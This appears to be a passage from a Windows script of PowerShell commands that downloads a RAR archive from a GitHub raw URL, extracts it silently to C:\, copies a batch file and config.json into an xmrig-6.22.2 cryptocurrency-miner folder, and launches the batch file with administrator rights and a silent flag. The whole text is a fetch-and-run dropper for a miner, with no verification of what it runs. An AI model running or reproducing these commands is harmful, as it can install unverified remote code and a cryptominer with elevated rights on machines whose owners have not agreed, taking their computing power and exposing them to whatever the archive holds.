...
powershell -NoProfile -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/main/ETHWSETUP.rar -OutFile C:\ETHWSETUP.rar"
powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -idq -o+ 'C:\ETHWSETUP.rar' 'C:\'"
powershell -NoProfile -Command "Start-Sleep -Seconds 2"
powershell -NoProfile -Command "Copy-Item -Path C:\ETHWRUN.bat -Destination C:\xmrig-6.22.2\ETHWRUN.bat -Force"
powershell -NoProfile -Command "Copy-Item -Path C:\config.json -Destination C:\xmrig-6.22.2\config.json -Force"
powershell -NoProfile -Command "Start-Process -FilePath 'C:\xmrig-6.22.2\ETHWRUN.bat' -ArgumentList '/S' -Verb RunAs"
